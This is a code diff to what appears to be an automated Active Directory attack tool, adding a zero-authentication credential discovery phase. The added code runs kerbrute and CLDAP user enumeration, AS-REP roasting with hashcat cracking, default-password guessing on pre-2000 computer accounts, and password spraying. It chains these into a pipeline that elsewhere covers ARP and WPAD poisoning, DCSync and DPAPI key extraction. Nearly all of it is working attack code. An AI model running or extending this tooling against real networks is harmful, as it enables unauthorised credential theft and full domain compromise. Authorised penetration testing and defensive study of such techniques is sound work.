@@ -52,7 +52,7 @@ from typing import Optional
 # Configuration
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-VERSION = "4.6.0"
+VERSION = "4.7.0"
 TOOLS_DIR = Path("/opt/tools")
 CVE_DIR = TOOLS_DIR / "CVE-2025-33073"
 
@@ -159,6 +159,12 @@ class Config:
 
     # DPAPI options
     no_dpapi: bool = False
+
+    # Credential discovery options (v4.7.0 — pre-cut zero-auth foothold)
+    no_discover: bool = False
+    users_file: str = ""           # path to user list; auto-falls back to SecLists
+    spray_password: str = ""       # single password to spray; empty = skip spray
+    discovered_users: list = field(default_factory=list, repr=False)
 
     # Runtime
     phase: str = "full"
@@ -1688,6 +1694,289 @@ def cleanup_dns_records(cfg: Config):
         run(parts, cfg, timeout=30)
 
     ok("DNS cleanup complete")
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Pre-cut Credential Discovery (zero-auth foothold finding)
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#
+# Six zero-auth techniques to find a first credential when classic
+# capture (ARP+relay, WPAD poisoning) is degraded by modern controls
+# (Defender for Identity, NAC, smart-card-primary auth, strong password
+# policy). Each technique is non-fatal — failures log and continue.
+
+# Built-in fallback usernames if no SecLists is present and no
+# --users-file is given. Tiny but high-yield list.
+_BUILTIN_USERS = [
+    "administrator", "admin", "guest", "krbtgt", "test", "user",
+    "service", "svc", "backup", "operator", "support", "helpdesk",
+    "sql", "sqladmin", "mssql", "exchange", "scanner", "printer",
+    "vmware", "webmaster", "ftp", "vpn", "wireless", "domainadmin",
+]
+
+# Common SecLists locations on Kali for username candidates.
+_SECLISTS_USER_PATHS = [
+    "/usr/share/seclists/Usernames/Names/names.txt",
+    "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
+    "/usr/share/wordlists/seclists/Usernames/Names/names.txt",
+]
+
+
+def _load_user_candidates(cfg: Config) -> list[str]:
+    """Pick a username list: --users-file > SecLists > built-in tiny list."""
+    if cfg.users_file and Path(cfg.users_file).is_file():
+        try:
+            return [ln.strip() for ln in Path(cfg.users_file).read_text().splitlines()
+                    if ln.strip() and not ln.startswith("#")]
+        except OSError as e:
+            log.warning(f"Could not read {cfg.users_file}: {e} — falling back")
+
+    for p in _SECLISTS_USER_PATHS:
+        if Path(p).is_file():
+            log.info(f"Using SecLists user candidates: {p}")
+            try:
+                return [ln.strip() for ln in Path(p).read_text().splitlines()
+                        if ln.strip() and not ln.startswith("#")]
+            except OSError:
+                continue
+
+    log.info("No SecLists or --users-file — using built-in 24-name shortlist")
+    return list(_BUILTIN_USERS)
+
+
+def _userenum_kerbrute(cfg: Config, candidates: list[str]) -> list[str]:
+    """Kerberos-based user enumeration via kerbrute. Returns valid usernames."""
+    if not tool_exists("kerbrute"):
+        log.info("kerbrute not installed — skipping Kerberos userenum")
+        return []
+    if not (cfg.dc_ip and cfg.domain):
+        log.info("No DC/domain known — skipping kerbrute userenum")
+        return []
+    cand_file = cfg.work_dir / "userenum-candidates.txt"
+    cand_file.write_text("\n".join(candidates) + "\n")
+    out_file = cfg.work_dir / "userenum-kerbrute.txt"
+    cmd = ["kerbrute", "userenum", "-d", cfg.domain, "--dc", cfg.dc_ip,
+           "-o", str(out_file), str(cand_file)]
+    log.info(f"🔍 kerbrute userenum ({len(candidates)} candidates)")
+    result = run(cmd, cfg, timeout=300)
+    valid = []
+    if out_file.exists():
+        for line in out_file.read_text().splitlines():
+            # kerbrute prints "[+] VALID USERNAME: user@DOMAIN"
+            m = re.search(r"VALID USERNAME:\s+(\S+?)@", line)
+            if m:
+                valid.append(m.group(1))
+    if valid:
+        ok(f"kerbrute confirmed {len(valid)} valid user(s)")
+        for u in valid[:10]:
+            detail(u)
+    return valid
+
+
+def _userenum_cldap(cfg: Config, candidates: list[str]) -> list[str]:
+    """CLDAP NetLogon ping userenum (sensepost technique). Returns valid users."""
+    if not tool_exists("userenum-cldap"):
+        log.info("userenum-cldap not installed — skipping CLDAP userenum")
+        return []
+    if not (cfg.dc_ip and cfg.domain):
+        log.info("No DC/domain known — skipping CLDAP userenum")
+        return []
+    cand_file = cfg.work_dir / "userenum-candidates.txt"
+    if not cand_file.exists():
+        cand_file.write_text("\n".join(candidates) + "\n")
+    out_file = cfg.work_dir / "userenum-cldap.txt"
+    cmd = ["userenum-cldap", cfg.dc_ip, cfg.domain, str(cand_file)]
+    log.info(f"🔍 CLDAP userenum ({len(candidates)} candidates)")
+    result = run(cmd, cfg, timeout=300, outfile=out_file)
+    valid = []
+    if out_file.exists():
+        for line in out_file.read_text().splitlines():
+            m = re.match(r"\[\+\]\s+(\S+)\s+exists", line)
+            if m:
+                valid.append(m.group(1))
+    if valid:
+        ok(f"CLDAP confirmed {len(valid)} valid user(s)")
+        for u in valid[:10]:
+            detail(u)
+    return valid
+
+
+def _asrep_roast_zero_auth(cfg: Config, users: list[str]) -> bool:
+    """AS-REP roast a userlist with no creds. Cracks any DONT_REQ_PREAUTH user.
+
+    Returns True if any credential was cracked into cfg.creds.
+    """
+    if not (tool_exists("impacket-GetNPUsers") and cfg.dc_ip and cfg.domain):
+        return False
+    if not users:
+        return False
+    user_file = cfg.work_dir / "asrep-userlist.txt"
+    user_file.write_text("\n".join(users) + "\n")
+    hash_file = cfg.work_dir / "asrep-hashes-zeroauth.txt"
+    cmd = ["impacket-GetNPUsers", f"{cfg.domain}/", "-usersfile", str(user_file),
+           "-no-pass", "-dc-ip", cfg.dc_ip, "-format", "hashcat",
+           "-outputfile", str(hash_file)]
+    log.info(f"🔍 AS-REP roast (zero-auth) over {len(users)} candidates")
+    run(cmd, cfg, timeout=180)
+    if not (hash_file.exists() and hash_file.stat().st_size > 0):
+        log.info("No AS-REP roastable accounts (good preauth posture)")
+        return False
+    ok(f"AS-REP hashes captured: {hash_file}")
+    # Crack what we got
+    if tool_exists("hashcat"):
+        cracked = cfg.work_dir / "asrep-cracked-zeroauth.txt"
+        run(["hashcat", "-m", "18200", str(hash_file), "/usr/share/wordlists/rockyou.txt",
+             "--quiet", "--outfile", str(cracked), "--outfile-format=2"],
+            cfg, timeout=600)
+        if cracked.exists() and cracked.stat().st_size > 0:
+            for line in cracked.read_text().splitlines():
+                # rockyou-cracked AS-REP comes back as just <password>
+                if line.strip():
+                    ok(f"🔑 Cracked AS-REP password — manual review needed: {cracked}")
+                    return True
+    return False
+
+
+def _pre2k_autotest(cfg: Config) -> bool:
+    """Pre-2000 computer accounts: default password = lowercase(computername).
+
+    Reads pre2k results from v4.6.0 nxc enrichment if present, then auto-
+    tests each candidate via nxc smb. Sets cfg.creds on first hit.
+    """
+    if not tool_exists("nxc"):
+        return False
+    pre2k_file = cfg.work_dir / "nxc-pre2k.txt"
+    if not pre2k_file.exists():
+        # Run pre2k inline if not already done
+        cmd = ["nxc", "ldap", cfg.dc_ip, "-u", "", "-p", "", "-M", "pre2k"]
+        run(cmd, cfg, timeout=120, outfile=pre2k_file)
+    if not pre2k_file.exists():
+        return False
+    # Extract computer names from nxc output (look for SamAccountName-like lines)
+    candidates = []
+    for line in pre2k_file.read_text().splitlines():
+        # nxc pre2k typically prints "[+] hostname$" or similar; conservative match
+        m = re.search(r"\b([A-Za-z0-9_-]+)\$", line)
+        if m:
+            candidates.append(m.group(1))
+    candidates = list(dict.fromkeys(candidates))  # dedupe, preserve order
+    if not candidates:
+        return False
+    log.info(f"🔍 Auto-testing {len(candidates)} pre2k candidate(s)")
+    for comp in candidates:
+        sam = f"{comp}$"
+        pwd = comp.lower()
+        cmd = ["nxc", "smb", cfg.dc_ip, "-u", sam, "-p", pwd, "-d", cfg.domain]
+        result = run(cmd, cfg, timeout=30)
+        if result.returncode == 0 and "[+]" in (result.stdout or ""):
+            ok(f"🔑 Pre2k credential works: {sam} / {pwd}")
+            cfg.username = sam
+            cfg.password = pwd
+            return True
+    return False
+
+
+def _password_spray(cfg: Config, users: list[str], password: str) -> bool:
+    """Single-password spray with one attempt per user. Stops on first hit.
+
+    Lockout-aware: explicit single password only; user is responsible for
+    timing if running multiple sprays.
+    """
+    if not (tool_exists("nxc") and password and users):
+        return False
+    user_file = cfg.work_dir / "spray-users.txt"
+    user_file.write_text("\n".join(users) + "\n")
+    out_file = cfg.work_dir / f"spray-{password}.txt"
+    cmd = ["nxc", "smb", cfg.dc_ip, "-u", str(user_file), "-p", password,
+           "-d", cfg.domain, "--continue-on-success"]
+    log.info(f"🔍 Spraying '{password}' across {len(users)} user(s)")
+    result = run(cmd, cfg, timeout=600, outfile=out_file)
+    if not out_file.exists():
+        return False
+    for line in out_file.read_text().splitlines():
+        # nxc success line example: "SMB <ip> 445 <host> [+] DOMAIN\\user:pass"
+        m = re.search(r"\[\+\]\s+\S+\\(\S+):" + re.escape(password), line)
+        if m:
+            user = m.group(1)
+            ok(f"🔑 Spray hit: {user} / {password}")
+            cfg.username = user
+            cfg.password = password
+            return True
+    log.info(f"Spray '{password}' returned no hits")
+    return False
+
+
+def run_credential_discovery(cfg: Config) -> bool:
+    """Pre-cut credential discovery: 6 zero-auth foothold techniques.
+
+    Order (cheap → expensive):
+      1. Username enum via Kerberos (kerbrute)
+      2. Username enum via CLDAP NetLogon ping (sensepost technique)
+      3. AS-REP roast against discovered users (still zero-auth)
+      4. Pre-2000 computer auto-test (default password = lowercase(host))
+      5. Password spray (only if --spray-password given)
+
+    Returns True if a credential was obtained (cfg.has_creds becomes True).
+    All output goes to cfg.work_dir/*.txt for offline review.
+    """
+    if cfg.no_discover:
+        log.info("--no-discover — skipping credential discovery phase")
+        return False
+    if not (cfg.dc_ip and cfg.domain):
+        log.warning("Credential discovery needs cfg.dc_ip + cfg.domain — skipping")
+        return False
+
+    phase_header("PRE-CUT CREDENTIAL DISCOVERY (zero-auth foothold)")
+
+    candidates = _load_user_candidates(cfg)
+    log.info(f"User candidates: {len(candidates)}")
+
+    # Step 1+2: Confirm which candidates exist via Kerberos + CLDAP
+    valid = set()
+    try:
+        valid.update(_userenum_kerbrute(cfg, candidates))
+    except Exception as e:
+        log.warning(f"kerbrute userenum failed: {e}")
+    try:
+        valid.update(_userenum_cldap(cfg, candidates))
+    except Exception as e:
+        log.warning(f"CLDAP userenum failed: {e}")
+
+    if valid:
+        cfg.discovered_users = sorted(valid)
+        users_file = cfg.work_dir / "valid-users.txt"
+        users_file.write_text("\n".join(cfg.discovered_users) + "\n")
+        ok(f"Confirmed {len(valid)} valid user(s) — saved to {users_file}")
+    else:
+        log.info("No users confirmed — falling back to candidate list for next steps")
+        cfg.discovered_users = candidates
+
+    # Step 3: AS-REP roast (zero-auth)
+    try:
+        if _asrep_roast_zero_auth(cfg, cfg.discovered_users):
+            return True
+    except Exception as e:
+        log.warning(f"AS-REP zero-auth roast failed: {e}")
+
+    # Step 4: Pre2k auto-test
+    try:
+        if _pre2k_autotest(cfg):
+            return True
+    except Exception as e:
+        log.warning(f"pre2k auto-test failed: {e}")
+
+    # Step 5: Spray (only if user explicitly opted in)
+    if cfg.spray_password:
+        try:
+            if _password_spray(cfg, cfg.discovered_users, cfg.spray_password):
+                return True
+        except Exception as e:
+            log.warning(f"Password spray failed: {e}")
+    else:
+        detail("No --spray-password given — skipping spray")
+
+    log.info("Credential discovery did not yield creds — falling through to ARP/WPAD/etc.")
+    return False
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -5373,8 +5662,17 @@ def run_full_auto(cfg: Config):
     detail("🔟  DCSync + DPAPI backup key extraction 👑")
     print()
 
-    # Step 0: Passive sniff to discover viable attacks
+    # Step 0: Passive sniff to discover viable attacks (auto-fills DC/domain)
     sniff_results = passive_sniff(cfg, duration=cfg.sniff_duration)
+
+    # Step 0.5: Pre-cut credential discovery — 6 zero-auth foothold techniques
+    # (kerbrute + CLDAP userenum, AS-REP roast, pre2k auto-test, spray).
+    # If this yields creds, we skip straight to authenticated chain.
+    got_creds_early = False
+    try:
+        got_creds_early = run_credential_discovery(cfg)
+    except Exception as e:
+        log.warning(f"Credential discovery phase crashed: {e}")
     wpad_viable = bool(sniff_results.get("wpad_llmnr") or sniff_results.get("dhcpv6")
                        or sniff_results.get("wpad_dns") or sniff_results.get("nbtns"))
     wsus_viable = bool(sniff_results.get("wsus"))
@@ -5396,8 +5694,13 @@ def run_full_auto(cfg: Config):
     sniffed_hosts.discard(cfg.attacker_ip)
     sniffed_hosts.discard(cfg.gateway)
 
-    # Step 1-3: ARP capture + crack (prioritize sniffed hosts)
-    got_creds = run_arp_capture(cfg, priority_hosts=sorted(sniffed_hosts) if sniffed_hosts else None)
+    # Step 1-3: ARP capture + crack (prioritize sniffed hosts).
+    # Skipped entirely if early credential discovery already got us in.
+    if got_creds_early:
+        ok("Pre-cut discovery yielded creds — skipping ARP/WPAD/WSUS/PXE")
+        got_creds = True
+    else:
+        got_creds = run_arp_capture(cfg, priority_hosts=sorted(sniffed_hosts) if sniffed_hosts else None)
 
     # Step 3b: WPAD poisoning (prioritize if passive sniff detected traffic)
     if not got_creds and not cfg.no_wpad:
@@ -5807,10 +6110,18 @@ def parse_args() -> Config:
     adv.add_argument("--no-dpapi", action="store_true",
                      help="Skip DPAPI backup key extraction after DCSync")
 
+    disc = p.add_argument_group("Credential Discovery (zero-auth foothold)")
+    disc.add_argument("--no-discover", action="store_true",
+                      help="Skip pre-cut credential discovery phase")
+    disc.add_argument("--users-file", default="",
+                      help="Path to candidate username list (default: SecLists)")
+    disc.add_argument("--spray-password", default="",
+                      help="Single password to spray across discovered users (lockout-aware: one attempt per user)")
+
     run_opts = p.add_argument_group("Execution")
     run_opts.add_argument("--phase", default="full",
                           choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
-                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich"],
+                                   "pxe", "sniff", "adcs", "roast", "sccm", "enrich", "discover"],
                           help="Run a single phase")
     run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
     run_opts.add_argument("-v", "--verbose", action="store_true", help="Debug output")
@@ -5863,6 +6174,9 @@ def parse_args() -> Config:
         machine_account=args.machine_account,
         machine_password=args.machine_password,
         no_dpapi=args.no_dpapi,
+        no_discover=args.no_discover,
+        users_file=args.users_file,
+        spray_password=args.spray_password,
         phase=args.phase,
         dry_run=args.dry_run,
         verbose=args.verbose,
@@ -6028,6 +6342,15 @@ def main():
                     log.error("--phase enrich requires credentials (-u/-p)")
                     sys.exit(1)
                 run_nxc_enrichment(cfg)
+
+            case "discover":
+                # Zero-auth: no -u/-p needed, but cfg.dc_ip + cfg.domain
+                # must be auto-discoverable from the network or supplied.
+                if not (cfg.dc_ip and cfg.domain):
+                    log.error("--phase discover needs --dc-ip + -d, "
+                              "or run --phase sniff first to auto-detect")
+                    sys.exit(1)
+                run_credential_discovery(cfg)
 
             case "full":
                 # Run new authenticated attacks before exploitation
